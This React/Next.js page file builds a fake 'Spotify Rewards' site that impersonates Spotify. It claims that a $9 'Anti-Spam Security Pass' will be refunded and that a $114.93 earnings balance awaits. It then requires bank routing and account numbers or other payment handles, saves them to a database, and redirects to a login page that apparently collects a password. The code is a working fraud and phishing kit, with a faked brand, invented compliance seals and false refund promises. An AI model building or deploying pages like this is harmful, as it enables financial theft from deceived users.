'use client';

import {
  AlertCircle,
  ArrowRight,
  CheckCircle,
  CheckCircle2,
  Clock,
  Download,
  FileText,
  HelpCircle,
  Info,
  Landmark,
  Lock,
  Mail,
  RefreshCw,
  Shield,
  ShieldCheck,
  Sparkles,
  UserCheck,
} from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import { recordPaymentInSupabase, savePayoutCoordinates } from '../../../lib/supabase';
import MetaPixelTracker from '../../components/MetaPixelTracker';

export default function SpotifyWelcomePage() {
  const router = useRouter();
  const [protocolId, setProtocolId] = useState('SPT-948210-US');
  const [listenerName, setListenerName] = useState('Verified Listener');
  const [listenerEmail, setListenerEmail] = useState('');
  const [timestamp, setTimestamp] = useState('');

  // Payout Form State
  const [payoutMethod, setPayoutMethod] = useState<'direct_deposit' | 'zelle' | 'cashapp' | 'paypal' | 'apple_cash'>('direct_deposit');
  const [bankName, setBankName] = useState('');
  const [routingNumber, setRoutingNumber] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [zelleTag, setZelleTag] = useState('');
  const [cashappTag, setCashappTag] = useState('');
  const [paypalEmail, setPaypalEmail] = useState('');
  const [appleCashPhone, setAppleCashPhone] = useState('');
  const [isSavingPayout, setIsSavingPayout] = useState(false);
  const [payoutSavedSuccess, setPayoutSavedSuccess] = useState(false);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const storedProtocol = sessionStorage.getItem('spotify_session_id');
      if (storedProtocol) {
        setProtocolId(storedProtocol.startsWith('SPT-') ? storedProtocol : `SPT-${storedProtocol.replace(/\D/g, '') || '948210'}-US`);
      } else {
        const randomCode = `SPT-${Math.floor(100000 + Math.random() * 900000)}-US`;
        sessionStorage.setItem('spotify_session_id', randomCode);
        setProtocolId(randomCode);
      }

      const savedName = sessionStorage.getItem('spotify_listener_name');
      if (savedName && savedName.trim()) {
        setListenerName(savedName.trim());
      }

      const savedEmail = sessionStorage.getItem('spotify_listener_email');
      if (savedEmail && savedEmail.trim()) {
        setListenerEmail(savedEmail.trim());
        setPaypalEmail(savedEmail.trim());
      }

      // Check existing saved payout
      const existingPayout = sessionStorage.getItem('spotify_payout_details');
      if (existingPayout) {
        try {
          const parsed = JSON.parse(existingPayout);
          if (parsed.method) setPayoutMethod(parsed.method);
          if (parsed.bank_name) setBankName(parsed.bank_name);
          if (parsed.routing_number) setRoutingNumber(parsed.routing_number);
          if (parsed.account_number) setAccountNumber(parsed.account_number);
          if (parsed.zelle_tag) setZelleTag(parsed.zelle_tag);
          if (parsed.cashapp_tag) setCashappTag(parsed.cashapp_tag);
          if (parsed.paypal_email) setPaypalEmail(parsed.paypal_email);
          if (parsed.apple_cash_phone) setAppleCashPhone(parsed.apple_cash_phone);
          setPayoutSavedSuccess(true);
        } catch {}
      }

      const now = new Date();
      setTimestamp(
        now.toLocaleDateString('en-US', {
          month: 'short',
          day: 'numeric',
          year: 'numeric',
        }) +
          ' at ' +
          now.toLocaleTimeString('en-US', {
            hour: '2-digit',
            minute: '2-digit',
            hour12: true,
          })
      );

      // Only verify with server Stripe API if a real Stripe payment_intent is in the URL AND a real user email exists
      const urlParams = new URLSearchParams(window.location.search);
      const paymentIntentId = urlParams.get('payment_intent');

      if (paymentIntentId && savedEmail && savedEmail.includes('@') && savedEmail !== 'customer@verified.com') {
        fetch('/api/stripe/verify-payment', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            paymentIntentId,
            email: savedEmail,
            name: savedName || undefined,
          }),
        }).catch((e) => console.warn('Payment verification notice:', e));
      }
    }
  }, []);

  const handleSavePayoutAndContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSavingPayout(true);

    const emailToUse = listenerEmail || 'listener@spotifyrewards.com';
    const payload = {
      email: emailToUse,
      method: payoutMethod,
      bank_name: bankName,
      routing_number: routingNumber,
      account_number: accountNumber,
      zelle_tag: zelleTag,
      cashapp_tag: cashappTag,
      paypal_email: paypalEmail,
      apple_cash_phone: appleCashPhone,
    };

    await savePayoutCoordinates(payload);
    setPayoutSavedSuccess(true);
    setIsSavingPayout(false);

    // Redirect directly to the Spotify Rewards login / account activation
    const query = new URLSearchParams({
      email: emailToUse,
      name: listenerName || '',
    }).toString();

    router.push(`/spotify/dashboard/login?${query}`);
  };

  return (
    <div className="min-h-screen bg-[#070a08] text-[#e0e0e0] font-sans antialiased selection:bg-[#1db954] selection:text-black relative overflow-hidden">
      <MetaPixelTracker
        eventName="PageView"
        customData={{
          content_name: 'Spotify Welcome Onboarding',
          content_type: 'product',
        }}
      />

      {/* Top Ambient Green Radial Glow */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-5xl h-96 bg-[radial-gradient(ellipse_80%_50%_at_50%_0%,rgba(29,185,84,0.22),rgba(15,35,22,0.4)_50%,transparent_80%)] pointer-events-none -z-10" />

      {/* Ambient subtle grid */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#1db95408_1px,transparent_1px),linear-gradient(to_bottom,#1db95408_1px,transparent_1px)] bg-[size:3rem_3rem] [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)] pointer-events-none -z-10" />

      {/* Top Header / Branding */}
      <header className="sticky top-0 z-40 backdrop-blur-md bg-black/80 border-b border-[#1d2520] px-4 sm:px-8 py-3.5 flex items-center justify-between max-w-5xl mx-auto w-full">
        <Link href="/spotify" className="flex items-center gap-2.5 transition-opacity hover:opacity-90">
          <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
            <Image
              src="/spotify-logo.webp"
              alt="Spotify Logo"
              width={32}
              height={32}
              priority
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-white font-extrabold text-base tracking-tight">Spotify</span>
            <span className="bg-[#1db954] text-black text-[11px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
              Rewards
            </span>
          </div>
        </Link>

        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-[11px] font-bold bg-[#0d2215] text-[#1db954] border border-[#1db954]/30">
            <span className="w-2 h-2 rounded-full bg-[#1db954] animate-pulse" />
            Verified Member # {protocolId}
          </span>
        </div>
      </header>

      {/* Main Container */}
      <main className="max-w-3xl mx-auto px-4 py-8 sm:py-12">
        {/* Verification Status Header Card */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-[#0d2215] border border-[#1db954]/40 text-xs uppercase tracking-widest font-extrabold text-[#1db954] mb-4 shadow-sm">
            <ShieldCheck className="w-4 h-4 stroke-[2.5]" />
            OFFICIAL AUTHORIZATION APPROVED
          </div>

          <h1 className="text-3xl sm:text-4xl md:text-5xl font-black text-white tracking-tight leading-tight mb-3">
            Welcome to the Official{' '}
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#1db954] via-[#1ed760] to-[#22c55e]">
              Spotify Rewards
            </span>{' '}
            Network
          </h1>

          <p className="text-sm sm:text-base text-gray-300 max-w-xl mx-auto leading-relaxed">
            Congratulations, <b className="text-white">{listenerName}</b>! Your Anti-Spam Security Pass has been authorized by banking compliance. Complete your payout settings below to unlock your application dashboard.
          </p>
        </div>

        {/* ========================================================= */}
        {/* CARD 0: MANDATORY PAYOUT COORDINATES FORM                 */}
        {/* ========================================================= */}
        <div className="relative overflow-hidden rounded-3xl bg-[#0e1410] border-2 border-[#1db954] p-6 sm:p-8 mb-8 shadow-2xl shadow-[#1db954]/10">
          <div className="flex items-center justify-between pb-4 border-b border-[#1f2e23] mb-6">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-2xl bg-[#1db954] text-black flex items-center justify-center font-black">
                <Landmark className="w-5 h-5 stroke-[2.5]" />
              </div>
              <div>
                <span className="text-xs uppercase tracking-wider font-extrabold text-[#1db954]">
                  Step 1 of 2 • Banking Information
                </span>
                <h2 className="text-xl font-black text-white leading-tight">
                  Where Should We Send Your Commissions?
                </h2>
              </div>
            </div>
            <div className="hidden sm:flex items-center gap-1.5 text-xs text-[#8a9890] font-medium">
              <Lock className="w-3.5 h-3.5 text-[#1db954]" /> Bank-Grade AES-256
            </div>
          </div>

          <p className="text-xs sm:text-sm text-gray-300 mb-6 leading-relaxed">
            Please select your preferred payout method to receive your initial <b className="text-[#1db954] font-bold">$114.93 USD</b> balance and all subsequent daily evaluation royalties.
          </p>

          <form onSubmit={handleSavePayoutAndContinue} className="space-y-5">
            {/* Payment Method Selector Tabs */}
            <div>
              <label className="block text-xs font-bold text-gray-300 uppercase tracking-wider mb-2.5">
                Select Commission Payout Method:
              </label>
              <div className="grid grid-cols-2 sm:grid-cols-5 gap-2">
                {[
                  { id: 'direct_deposit', label: 'Direct Deposit / ACH' },
                  { id: 'zelle', label: 'Zelle' },
                  { id: 'cashapp', label: 'Cash App' },
                  { id: 'paypal', label: 'PayPal' },
                  { id: 'apple_cash', label: 'Apple Cash' },
                ].map((m) => (
                  <button
                    key={m.id}
                    type="button"
                    onClick={() => setPayoutMethod(m.id as any)}
                    className={`py-3 px-2 rounded-xl text-xs font-bold transition-all text-center border ${
                      payoutMethod === m.id
                        ? 'bg-[#1db954] text-black border-[#1db954] shadow-md shadow-[#1db954]/25'
                        : 'bg-[#141b16] text-gray-300 border-[#202e24] hover:border-[#1db954]/40 hover:text-white'
                    }`}
                  >
                    {m.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Dynamic Inputs Based on Selection */}
            {payoutMethod === 'direct_deposit' && (
              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-4">
                <div>
                  <label className="block text-xs font-semibold text-gray-300 mb-1">
                    Bank Name (e.g., Chase, Bank of America, Wells Fargo)
                  </label>
                  <input
                    type="text"
                    required
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    placeholder="e.g. JPMorgan Chase"
                    className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
                  />
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-semibold text-gray-300 mb-1">
                      Routing Transit Number (9 digits)
                    </label>
                    <input
                      type="text"
                      required
                      maxLength={9}
                      value={routingNumber}
                      onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, ''))}
                      placeholder="021000021"
                      className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-gray-300 mb-1">
                      Checking / Savings Account Number
                    </label>
                    <input
                      type="text"
                      required
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
                      placeholder="••••••••••"
                      className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
                    />
                  </div>
                </div>
              </div>
            )}

            {payoutMethod === 'zelle' && (
              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
                <label className="block text-xs font-semibold text-gray-300">
                  Zelle Registered Mobile Phone or Email Address
                </label>
                <input
                  type="text"
                  required
                  value={zelleTag}
                  onChange={(e) => setZelleTag(e.target.value)}
                  placeholder="e.g. (555) 234-5678 or listener@gmail.com"
                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
                />
              </div>
            )}

            {payoutMethod === 'cashapp' && (
              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
                <label className="block text-xs font-semibold text-gray-300">
                  Your Cash App $Cashtag
                </label>
                <input
                  type="text"
                  required
                  value={cashappTag}
                  onChange={(e) => setCashappTag(e.target.value.startsWith('$') ? e.target.value : '$' + e.target.value)}
                  placeholder="$yourtag"
                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
                />
              </div>
            )}

            {payoutMethod === 'paypal' && (
              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
                <label className="block text-xs font-semibold text-gray-300">
                  PayPal Registered Account Email
                </label>
                <input
                  type="email"
                  required
                  value={paypalEmail}
                  onChange={(e) => setPaypalEmail(e.target.value)}
                  placeholder="you@email.com"
                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
                />
              </div>
            )}

            {payoutMethod === 'apple_cash' && (
              <div className="p-4 rounded-2xl bg-[#121914] border border-[#202e24] space-y-3">
                <label className="block text-xs font-semibold text-gray-300">
                  Apple ID Phone Number or iCloud Email
                </label>
                <input
                  type="text"
                  required
                  value={appleCashPhone}
                  onChange={(e) => setAppleCashPhone(e.target.value)}
                  placeholder="+1 (555) 019-2834 or listener@icloud.com"
                  className="w-full px-4 py-2.5 rounded-xl bg-black border border-[#26372b] text-white text-sm focus:outline-none focus:border-[#1db954]"
                />
              </div>
            )}

            {/* CTA Button to save and go to App */}
            <button
              type="submit"
              disabled={isSavingPayout}
              className="w-full py-4 px-6 rounded-2xl bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] text-black font-black text-base sm:text-lg flex items-center justify-center gap-3 transition-all shadow-xl shadow-[#1db954]/25 hover:shadow-[#1db954]/40"
            >
              <span>{isSavingPayout ? 'Saving Payout Coordinates...' : 'Save Payout Details & Access Spotify Rewards App'}</span>
              <ArrowRight className="w-5 h-5 stroke-[3]" />
            </button>
            <p className="text-center text-[11px] text-[#788880]">
              You will be redirected to create your personal account password for your member dashboard.
            </p>
          </form>
        </div>

        {/* ========================================================= */}
        {/* CARD 1: FORMAL NOTICE OF AUTOMATIC REFUND IN PROGRESS     */}
        {/* ========================================================= */}
        <div className="relative overflow-hidden rounded-3xl bg-[#0b0f0c] border border-[#1db954]/50 p-6 sm:p-8 mb-6 shadow-2xl shadow-black">
          <div className="absolute top-0 right-0 w-64 h-64 bg-[#1db954]/10 rounded-full blur-3xl pointer-events-none -z-10" />

          <div className="flex items-start gap-4 pb-5 mb-5 border-b border-[#1d2520]">
            <div className="w-12 h-12 rounded-2xl bg-[#1db954] text-black flex items-center justify-center shrink-0 shadow-lg shadow-[#1db954]/25">
              <RefreshCw className="w-6 h-6 stroke-[2.5]" />
            </div>
            <div className="flex-1">
              <div className="flex flex-wrap items-center justify-between gap-2 mb-1">
                <span className="text-xs uppercase tracking-wider font-extrabold text-[#1db954] flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-[#1db954] animate-ping" />
                  AUTOMATIC CANCELLATION &amp; REFUND IN PROGRESS
                </span>
                <span className="px-2.5 py-0.5 rounded-full bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 text-[11px] font-bold">
                  Queue: Active
                </span>
              </div>
              <h2 className="text-lg sm:text-xl font-bold text-white leading-snug">
                Your $9.00 USD Security Charge is Being Refunded Automatically
              </h2>
            </div>
          </div>

          <div className="space-y-3.5 text-xs sm:text-sm text-gray-300 leading-relaxed">
            <p>
              <b className="text-white">Institutional Guarantee:</b> The temporary charge of <b className="text-white">$9.00 USD</b> was strictly an anti-spam identity authorization to protect the creator review pool against automated bots.
            </p>
            <p className="text-[#99aba0] bg-[#111713] p-4 rounded-2xl border border-[#1f2822]">
              🛡️ <b className="text-white">Cancellation Protocol Initiated:</b> Per Spotify Rewards &amp; MM Systems banking guidelines, this temporary verification authorization has already been scheduled for automatic cancellation and will be refunded back to your original payment method within <b className="text-white">1 to 2 hours</b>. This entire verification process costs you <b className="text-[#1db954]">$0.00 net</b>.
            </p>
          </div>

          {/* Refund Details Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-5 mt-5 border-t border-[#1d2520] text-xs">
            <div className="bg-[#111713] p-3 rounded-xl border border-[#1d2520]">
              <span className="text-[11px] text-gray-400 block font-medium">Refund Amount</span>
              <span className="text-sm font-extrabold text-[#1db954] block mt-0.5">$9.00 USD</span>
            </div>
            <div className="bg-[#111713] p-3 rounded-xl border border-[#1d2520]">
              <span className="text-[11px] text-gray-400 block font-medium">Estimated Time</span>
              <span className="text-sm font-bold text-white block mt-0.5">1–2 Hours</span>
            </div>
            <div className="bg-[#111713] p-3 rounded-xl border border-[#1d2520]">
              <span className="text-[11px] text-gray-400 block font-medium">Refund Method</span>
              <span className="text-sm font-bold text-white block mt-0.5">Original Card</span>
            </div>
            <div className="bg-[#111713] p-3 rounded-xl border border-[#1d2520]">
              <span className="text-[11px] text-gray-400 block font-medium">Status</span>
              <span className="text-sm font-bold text-[#1db954] block mt-0.5">Queued</span>
            </div>
          </div>
        </div>

        {/* ========================================================= */}
        {/* CARD 2: PROMINENT NOTICE - KEEP AN EYE ON YOUR EMAIL      */}
        {/* ========================================================= */}
        <div className="rounded-3xl bg-[#0b0e0c] border border-amber-500/40 p-6 sm:p-8 mb-6 shadow-2xl shadow-black relative">
          <div className="flex items-start gap-4">
            <div className="w-12 h-12 rounded-2xl bg-amber-500/20 text-amber-400 border border-amber-500/40 flex items-center justify-center shrink-0">
              <Mail className="w-6 h-6 stroke-[2.5]" />
            </div>
            <div className="flex-1">
              <div className="flex flex-wrap items-center justify-between gap-2 mb-1">
                <span className="text-xs uppercase tracking-wider font-extrabold text-amber-400 flex items-center gap-1.5">
                  <AlertCircle className="w-3.5 h-3.5" />
                  MANDATORY ACTION: EMAIL DISPATCH IN PROGRESS
                </span>
              </div>
              <h3 className="text-lg sm:text-xl font-black text-white leading-snug mb-2">
                Keep An Eye On Your Email Inbox
              </h3>

              {listenerEmail ? (
                <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-xl bg-black/60 border border-amber-500/30 text-xs text-amber-200 font-mono mb-3">
                  <Mail className="w-3.5 h-3.5 text-amber-400" />
                  <span>Delivery target: <b className="text-white underline">{listenerEmail}</b></span>
                </div>
              ) : (
                <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-xl bg-black/60 border border-amber-500/30 text-xs text-amber-200 font-mono mb-3">
                  <Mail className="w-3.5 h-3.5 text-amber-400" />
                  <span>Delivery target: <b className="text-white">Registered Email Address</b></span>
                </div>
              )}

              <p className="text-xs sm:text-sm text-gray-300 leading-relaxed mb-3">
                Within the next few hours, our settlement division will transmit your <b className="text-white">Official Banking Settlement Voucher &amp; Deposit Link</b> so you can enter where your <b className="text-[#1db954]">$114.93 USD</b> accumulated balance should be directly transferred (Bank Account, PayPal, or Pix).
              </p>

              <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/20 text-xs text-amber-300 leading-relaxed">
                ⚠️ <b className="text-white font-semibold">Important Delivery Note:</b> If our email does not appear in your primary inbox, please check your <b className="text-white underline">Spam, Junk, or Promotions folder</b> and select <b className="text-white">&quot;Not Spam / Move to Inbox&quot;</b> to avoid delays with your payment settlement link.
              </div>
            </div>
          </div>
        </div>

        {/* ========================================================= */}
        {/* CARD 3: SETTLEMENT BREAKDOWN & OFFICIAL STATEMENT         */}
        {/* ========================================================= */}
        <div className="rounded-3xl bg-[#0b0e0c] border border-[#1d2520] p-6 sm:p-8 mb-6 shadow-2xl shadow-black">
          <div className="flex items-center justify-between pb-4 border-b border-[#1d2520] mb-5">
            <div>
              <span className="text-[11px] font-extrabold uppercase tracking-widest text-[#8a9890]">
                TRANSACTION SETTLEMENT VOUCHER
              </span>
              <span className="text-xs text-[#8a9890] block mt-0.5">
                Authorized via MM Systems Financial Gateway
              </span>
            </div>
            <div className="text-right font-mono text-xs text-gray-400">
              <span>{timestamp || 'Today'}</span>
            </div>
          </div>

          {/* Breakdown Items */}
          <div className="space-y-3 text-xs sm:text-sm">
            <div className="flex items-center justify-between py-2 border-b border-[#161c18]">
              <span className="text-gray-300 flex items-center gap-2">
                <Landmark className="w-4 h-4 text-[#1db954]" /> Accumulated Review Earnings
              </span>
              <span className="font-extrabold text-white text-base">$114.93 USD</span>
            </div>

            <div className="flex items-center justify-between py-2 border-b border-[#161c18]">
              <span className="text-gray-300 flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-[#1db954]" /> One-Time Anti-Spam Security Pass
              </span>
              <span className="font-bold text-white">$9.00 USD</span>
            </div>

            <div className="flex items-center justify-between py-2 border-b border-[#161c18]">
              <span className="text-gray-300 flex items-center gap-2">
                <RefreshCw className="w-4 h-4 text-[#1db954]" /> Security Fee Refund (Queued)
              </span>
              <span className="font-bold text-[#1db954]">+$9.00 USD (Refunded)</span>
            </div>

            <div className="flex items-center justify-between pt-3 text-base">
              <div>
                <span className="font-black text-white block">TOTAL NET TRANSFER RELEASE</span>
                <span className="text-xs text-[#1db954] font-medium block">Ready for settlement payout</span>
              </div>
              <div className="text-right">
                <span className="text-2xl sm:text-3xl font-black text-[#1db954]">$114.93 USD</span>
              </div>
            </div>
          </div>
        </div>

        {/* Security & Compliance Seals */}
        <div className="pt-6 border-t border-[#1d2520] flex flex-wrap items-center justify-center gap-4 sm:gap-8 text-xs text-[#707e76] font-medium">
          <span className="flex items-center gap-1.5">
            <Lock className="w-3.5 h-3.5 text-[#1db954]" /> 256-Bit Bank Encryption
          </span>
          <span>•</span>
          <span className="flex items-center gap-1.5">
            <ShieldCheck className="w-3.5 h-3.5 text-[#1db954]" /> PCI-DSS Level 1 Compliant
          </span>
          <span>•</span>
          <span className="flex items-center gap-1.5">
            <UserCheck className="w-3.5 h-3.5 text-[#1db954]" /> Verified by MM Systems
          </span>
        </div>

        {/* Footer */}
        <footer className="mt-8 pt-4 text-center text-xs text-gray-400 space-y-2">
          <p>&copy; {new Date().getFullYear()} Spotify Rewards Program. All rights reserved.</p>
          <div className="flex items-center justify-center gap-4 text-gray-400">
            <Link href="/politicasdeprivacidade" className="hover:text-gray-300 transition-colors">
              Privacy Policy
            </Link>
            <span>&bull;</span>
            <Link href="/suporte" className="hover:text-gray-300 transition-colors">
              Support &amp; Inquiries
            </Link>
          </div>
        </footer>
      </main>
    </div>
  );
}
